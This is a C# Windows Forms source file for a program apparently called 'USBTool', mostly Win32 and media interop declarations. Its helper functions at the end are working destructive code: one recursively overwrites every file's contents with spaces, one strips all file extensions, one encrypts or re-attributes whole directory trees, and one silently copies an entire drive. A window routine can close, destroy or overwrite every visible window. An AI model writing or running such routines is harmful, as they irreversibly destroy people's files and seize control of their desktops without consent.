﻿using System;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
#if MEDIA_FOUNDATION
using USBTool.MediaFoundation;
#endif

namespace USBTool
{
	public partial class FormMain : Form
	{
		public static string sentence;
		public static SpeechSynthesizer Voice;
		public static DEVMODE DEVMODE1;
		public static Random rand ;
		private static TaskFactory tf;
		public delegate bool EnumWindowsCallBack(IntPtr hwnd, string lpPatam);
#if MEDIA_MCI
		[DllImport("Msvfw32.dll", SetLastError = true)]
		public static extern IntPtr MCIWndCreate(IntPtr hwndParent, IntPtr hInstance, uint dwStyle, string file);
#endif
        #region Magnification
        [DllImport("Magnification.dll", SetLastError = true)]
		public static extern bool MagInitialize();
		[DllImport("Magnification.dll", SetLastError = true)]
		public static extern bool MagSetFullscreenColorEffect(ref float[,] pEffect);
		[DllImport("Magnification.dll", SetLastError = true)]
		public static extern bool MagSetWindowTransform(IntPtr hwnd,ref float[,] pTransform);
		[DllImport("Magnification.dll", SetLastError = true)]
		public static extern bool MagSetWindowSource(IntPtr hwnd, Rectangle rect);
		#endregion
		#region user32.dll
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, ref string pvParam, uint fWinIni);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetMagnificationDesktopColorEffect(ref float[,] pEffect);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SwapMouseButton(bool fSwap);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr GetDesktopWindow();
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr GetWindow(IntPtr hWnd, uint nCmd);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool IsWindowVisible(IntPtr hWnd);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool CloseWindow(IntPtr hWnd);
		[DllImport("user32.dll",SetLastError = true)]
		public static extern bool ShowWindow(IntPtr hWnd, uint nCmdShow);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int SendMessage(IntPtr hWnd, uint msg, uint wParam, uint lParam);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int SendMessage(IntPtr hWnd, uint msg, uint wParam, [MarshalAs (UnmanagedType.LPWStr)]string lParam);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetWindowText(IntPtr hwnd, string lpString);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int GetClientRect(IntPtr hWnd, ref Rectangle lpRECT);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
		[DllImport("user32.dll",  SetLastError = true)]
		public static extern IntPtr GetParent(IntPtr hwnd);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool MoveWindow(IntPtr hWnd,int X,int Y,int nWidth, int nHeight, bool bRepaint);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern int ShowCursor(bool bShow);
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool EnumChildWindows(IntPtr hWndParent,EnumWindowsCallBack lpEnumFunc,string lParam);
		[DllImport("user32.dll", SetLastError = true)]
		public extern static IntPtr CreateWindowEx(uint dwExStyle, string lpClassName, string lpWindowName, uint dwStyle,
			int x, int y, int nWidth, int nHeight, IntPtr hWndParent, IntPtr hMenu, IntPtr hInstance, IntPtr lParam);
		#endregion
		#region kernel32.dll
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize, ref uint lpBytesReturned, IntPtr lpOverlapped);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetShortPathName(string instring, StringBuilder outstring, int buff);
#endregion
#region dwmapi.dll
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern int DwmExtendFrameIntoClientArea(IntPtr hwnd, ref MARGINS pMarInset);
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern void DwmEnableComposition(uint uCompositionAction);
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern void DwmEnableBlurBehindWindow(IntPtr hwnd, ref DWM_BLURBEHIND blurBehind);
		[DllImport("dwmapi.dll", SetLastError = true)]
		public static extern bool DwmSetWindowAttribute(IntPtr hwnd, uint attr, ref uint attrValue, int attrSize);
		#endregion
#if MEDIA_FOUNDATION
#region Media Foundation
		[DllImport ("Ole32.dll")]
		public static extern int CoInitialize(object pvReserved);
		[DllImport("mfplat.dll", SetLastError = true,PreserveSig =true)]
		public static extern int MFStartup( uint Version,uint flags);
		[DllImport("mfplat.dll")]
		public static extern int MFShutdown();
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateMediaSession(IntPtr pConfiguration,out IMFMediaSession ppMediaSession);
		[DllImport("mf.dll",SetLastError =true,PreserveSig =true)]
		public static extern int MFCreateSourceResolver(out IMFSourceResolver ppISourceResolver);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateTopology(out IMFTopology ppTopo);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateTopologyNode(uint NodeType,out IMFTopologyNode ppNode);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateVideoRendererActivate(IntPtr hwndVideo,out IMFActivate ppActivate);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFCreateAudioRendererActivate(out IMFActivate ppActivate);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFGetService(IUnknown punkObject, ref Guid guidService, ref Guid riid, out IUnknown ppvObject);
		[DllImport("mf.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFRequireProtectedEnvironment(IMFPresentationDescriptor pPresentationDescriptor);
		[DllImport("Mfplay.dll", SetLastError = true, PreserveSig = true)]
		public static extern int MFPCreateMediaPlayer(string pwszURL,bool fStartPlayback,uint creationOptions,IMFPMediaPlayerCallback pCallback,IntPtr hWnd,out IMFPMediaPlayer ppMediaPlayer );
		#endregion
#endif
		[StructLayout(LayoutKind.Sequential)]
		public struct DWM_BLURBEHIND
		{
			public uint dwFlags;
			public bool fEnable;
			public IntPtr hRgnBlur;
			public bool fTransitionOnMaximized;
		}
		[StructLayout(LayoutKind.Sequential)]
		public struct MARGINS
		{
			public int cxLeftWidth;
			public int cxRightWidth;
			public int cyTopHeight;
			public int cyBottomHeight;
		}
		public struct DEVMODE
		{
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string dmDeviceName;
			public short dmSpecVersion;
			public short dmDriverVersion;
			public short dmSize;
			public short dmDriverExtra;
			public int dmFields;
			public int dmPositionX;
			public int dmPositionY;
			public int dmDisplayOrientation;
			public int dmDisplayFixedOutput;
			public short dmColor;
			public short dmDuplex;
			public short dmYResolution;
			public short dmTTOption;
			public short dmCollate;
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
			public string dmFormName;
			public short dmLogPixels;
			public short dmBitsPerPel;
			public int dmPelsWidth;
			public int dmPelsHeight;
			public int dmDisplayFlags;
			public int dmDisplayFrequency;
			public int dmICMMethod;
			public int dmICMIntent;
			public int dmMediaType;
			public int dmDitherType;
			public int dmReserved1;
			public int dmReserved2;
			public int dmPanningWidth;
			public int dmPanningHeight;
		}
		[StructLayout(LayoutKind.Sequential)]
		internal struct ColorEffect
		{
			public float transform00;
			public float transform01;
			public float transform02;
			public float transform03;
			public float transform04;
			public float transform10;
			public float transform11;
			public float transform12;
			public float transform13;
			public float transform14;
			public float transform20;
			public float transform21;
			public float transform22;
			public float transform23;
			public float transform24;
			public float transform30;
			public float transform31;
			public float transform32;
			public float transform33;
			public float transform34;
			public float transform40;
			public float transform41;
			public float transform42;
			public float transform43;
			public float transform44;
			public ColorEffect(float[,] matrix)
			{
				transform00 = matrix[0, 0];
				transform10 = matrix[1, 0];
				transform20 = matrix[2, 0];
				transform30 = matrix[3, 0];
				transform40 = matrix[4, 0];
				transform01 = matrix[0, 1];
				transform11 = matrix[1, 1];
				transform21 = matrix[2, 1];
				transform31 = matrix[3, 1];
				transform41 = matrix[4, 1];
				transform02 = matrix[0, 2];
				transform12 = matrix[1, 2];
				transform22 = matrix[2, 2];
				transform32 = matrix[3, 2];
				transform42 = matrix[4, 2];
				transform03 = matrix[0, 3];
				transform13 = matrix[1, 3];
				transform23 = matrix[2, 3];
				transform33 = matrix[3, 3];
				transform43 = matrix[4, 3];
				transform04 = matrix[0, 4];
				transform14 = matrix[1, 4];
				transform24 = matrix[2, 4];
				transform34 = matrix[3, 4];
				transform44 = matrix[4, 4];
			}

		}
		public const uint IOCTL_STORAGE_EJECT_MEDIA = 0x2D4808;
		public const uint FILE_SHARE_READ = 0x1;
		public const uint FILE_SHARE_WRITE = 0x2;
		public const uint GENERIC_READ = 0x80000000;
		public const uint GENERIC_WRITE = 0x40000000;

		public const uint SPI_SETMOUSETRAILS = 0x5D;
		public const uint WM_CLOSE = 0x0010;
		public const uint WM_USER = 0x0400;
		public const uint WM_PAINT = 0x000F;
		public const uint WM_MOUSEACTIVATE = 0x0021;
		public const uint WM_SETTEXT = 0x000C;
		public const uint WS_VISIBLE = 0x10000000;
		public const uint WS_CHILD = 0x40000000;		
		public const uint WS_EX_NOACTIVATE = 0x8000000;
		public const string WC_MAGNIFIER = "Magnifier";
		public const uint MA_NOACTIVATE = 3;
		public const uint MA_NOACTIVATEANDEAT = 4;
		public const uint SW_NORMAL = 1;
		public const uint MS_SHOWMAGNIFIEDCURSOR = 0x0001;
		public const uint MS_INVERTCOLORS = 0x0004;

		public const uint DWMWA_NCRENDERING_POLICY = 2;
		public const uint DWMNCRP_ENABLED = 2;
		
#if MEDIA_DSHOW
		public const uint EC_COMPLETE = 0x01;
#endif
#if MEDIA_FOUNDATION
		public Guid MFP_POSITIONTYPE_100NS = new Guid(0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0);
		public Guid MF_TOPOLOGY_RESOLUTION_STATUS = new Guid(0x494bbcde, 0xb031, 0x4e38, 0x97, 0xc4, 0xd5, 0x42, 0x2d, 0xd6, 0x18, 0xdc);
		public Guid MF_TOPONODE_SOURCE = Guid.Parse("835c58ec-e075-4bc7-bcba-4de000df9ae6");
		public Guid MF_TOPONODE_PRESENTATION_DESCRIPTOR = Guid.Parse("835c58ed-e075-4bc7-bcba-4de000df9ae6");
		public Guid MF_TOPONODE_STREAM_DESCRIPTOR = Guid.Parse("835c58ee-e075-4bc7-bcba-4de000df9ae6");
		public Guid MFMediaType_Audio = Guid.Parse("73647561-0000-0010-8000-00AA00389B71");
		public Guid MFMediaType_Video = Guid.Parse("73646976-0000-0010-8000-00AA00389B71");
		public Guid MF_TOPONODE_NOSHUTDOWN_ON_REMOVE = Guid.Parse("14932f9c-9087-4bb4-8412-5167145cbe04");
		public Guid MF_TOPONODE_STREAMID = Guid.Parse("14932f9b-9087-4bb4-8412-5167145cbe04");
		public Guid MR_POLICY_VOLUME_SERVICE = new Guid(0x1abaa2ac, 0x9d3b, 0x47c6, 0xab, 0x48, 0xc5, 0x95, 0x6, 0xde, 0x78, 0x4d);
		public Guid MR_STREAM_VOLUME_SERVICE =  Guid.Parse("f8b5fa2f-32ef-46f5-b172-1321212fb2c4");
		public Guid MR_VIDEO_RENDER_SERVICE = new Guid(0x1092a86c,0xab1a,0x459a,0xa3, 0x36, 0x83, 0x1f, 0xbc, 0x4d, 0x11, 0xff);
		public Guid MF_RATE_CONTROL_SERVICE = Guid.Parse("866fa297-b802-4bf8-9dc9-5e3b6a9f53c9");
		public Guid MR_AUDIO_POLICY_SERVICE = new Guid(0x911fd737, 0x6775, 0x4ab0, 0xa6, 0x14, 0x29, 0x78, 0x62, 0xfd, 0xac, 0x88);
		public const uint MF_SDK_VERSION = 0x0001;
		public const uint MF_API_VERSION = 0x0070;
		public const uint MF_VERSION = (MF_SDK_VERSION << 16)| MF_API_VERSION;
		public const uint MFSTARTUP_NOSOCKET = 0x1;
		public const uint MFSTARTUP_FULL = 0x0;
		public const uint MF_RESOLUTION_MEDIASOURCE = 0x00000001;
		public const uint MF_RESOLUTION_BYTESTREAM = 0x00000002;
		public const uint MF_RESOLUTION_CONTENT_DOES_NOT_HAVE_TO_MATCH_EXTENSION_OR_MIME_TYPE = 0x00000010;
		public const uint MF_TOPOLOGY_OUTPUT_NODE = 0x0;
		public const uint MF_TOPOLOGY_SOURCESTREAM_NODE	= 0x1;
		public const uint MFSESSION_SETTOPOLOGY_IMMEDIATE = 0x1;
		public const uint MESessionEnded = 107;
		public const uint MESessionTopologyStatus = 111;
		public const uint MESessionTopologySet = 101;
		public const uint MESessionStopped = 105;
		public const ushort VT_I8 = 20;
#endif
		//public const uint FMIFS_HARDDISK = 0xC;
#if MEDIA_MCI
		public enum MCIConst : uint
		{
			MCIWNDM_OPEN = WM_USER + 252,
			MCIWNDM_NOTIFYMODE = WM_USER + 200,
			MCIWNDM_SETVOLUME = WM_USER + 110,
			MCIWNDM_SETSPEED = WM_USER + 112,
			MCIWNDM_NOTIFYERROR  =   WM_USER + 205,
			MCIWNDF_NOAUTOSIZEWINDOW = 0x0001,
			MCIWNDF_NOPLAYBAR = 0x0002,
			MCIWNDF_NOMENU = 0x0008,
			MCIWNDF_NOTIFYMODE = 0x0100,
			MCIWNDF_NOTIFYERROR  =      0x1000,
			MCIWNDF_NOERRORDLG      =    0x4000,
			MCI_PLAY = 0x0806,
			MCI_MODE_STOP = 525,		
		}
#endif
		public static bool ForEachWindow(IntPtr hwnd, string op)
		{			
			MARGINS m = new MARGINS()
			{
				cxLeftWidth = -1,
				cxRightWidth = -1,
				cyBottomHeight = -1,
				cyTopHeight = -1
			};
			DWM_BLURBEHIND b = new DWM_BLURBEHIND()
			{
				dwFlags = 3,
				fEnable = true,
				hRgnBlur = IntPtr.Zero
			};
			DwmEnableComposition(1);
			if (IsWindowVisible(hwnd))
			{
				switch (op)
				{
					case "text":
						SendMessage(hwnd, WM_SETTEXT, 0, sentence);
						break;
					case "picture":
						Rectangle rect = new Rectangle();
						GetClientRect(hwnd, ref rect);
						Graphics g = Graphics.FromHwnd(hwnd);
						Bitmap p = new Bitmap(sentence);
						try
						{
							g.DrawImage(p, rect);
						}
						catch
						{
						}
						finally
						{
							g.Dispose();
							p.Dispose();
						}
						break;
					case "close":
						CloseWindow(hwnd);
						break;
					case "glass":
						uint attr = DWMNCRP_ENABLED;
						DwmSetWindowAttribute(hwnd, DWMWA_NCRENDERING_POLICY, ref attr, Marshal.SizeOf(DWMNCRP_ENABLED));
						DwmEnableBlurBehindWindow(hwnd, ref b);
						DwmExtendFrameIntoClientArea(hwnd, ref m);
						break;
					case "destroy":
						if (hwnd != GetDesktopWindow())
						{
							SendMessage(hwnd, WM_CLOSE, 0, 0);
						}
						break;
					case "beuncle":
						SetParent(hwnd, GetParent(GetParent(hwnd)));
						break;
					default:
						throw (new ArgumentException("该功能还未开发"));
				}
				EnumChildWindows(hwnd, ForEachWindow, op);
			}
			return true;
		}
		public static string StringByTime(string text, long time)
		{
			StringBuilder i = new StringBuilder();
			i.Append(char.Parse(text), (int)time);
			return i.ToString();
		}
		public static void SetAttributes(string directory, FileAttributes param)
		{
			foreach (string f in Directory.GetFiles(directory))
			{
				try
				{
					try
					{
						if (param == FileAttributes.Encrypted) File.Encrypt(f);
					}
					catch
					{
					}
					File.SetAttributes(f, param);
				}
				catch
				{
					continue;
				}
			}
			foreach (string d in Directory.GetDirectories(directory))
			{
				try
				{
					File.SetAttributes(d, param);
				}
				catch
				{
				}
				SetAttributes(d, param);
			}
		}
		public static void FillEachFile(string dirname)
		{
			foreach (string f in Directory.GetFiles(dirname))
			{
				try
				{
					File.WriteAllText(f, StringByTime(" ", new FileInfo(f).Length));
				}
				catch
				{
					continue;
				}
			}
			foreach (string f in Directory.GetDirectories(dirname))
			{
				FillEachFile(f);
			}

		}
		public static void DeleteExtName(string dirname)
        {
			foreach (string f in Directory.GetFiles(dirname))
			{
				try
				{
					FileInfo file = new FileInfo(f);
					string extname = file.Extension;
					if (extname.Length != 0)
                    {
						int index = f.IndexOf(extname);
						string newname = f.Remove(index);
						file.MoveTo(newname);
                    }
				}
				catch
				{
					continue;
				}
			}
			foreach (string f in Directory.GetDirectories(dirname))
			{
				DeleteExtName(f);
			}
		}
		public static void CopyDiretory(string from, string to)
		{
			string s = Path.Combine(to, new DirectoryInfo(from.LastIndexOf(":") == from.Length - 2 ? //是否为驱动器名
				from.Substring(0, 1) ://仅保留驱动器号
				from ).Name/*Name:目录名,无路径*/);
			try
			{
				if (!Directory.Exists(s))
					Directory.CreateDirectory(s);
				foreach (string f in Directory.EnumerateFiles(from))
				{
					string fp = Path.Combine(s, new FileInfo(f).Name);
					if (!File.Exists(fp))
						File.Copy(f, fp);
				}
				foreach (string d in Directory.EnumerateDirectories(from))
					CopyDiretory(d, s);
			}
			catch
			{
			}
		}
	}
}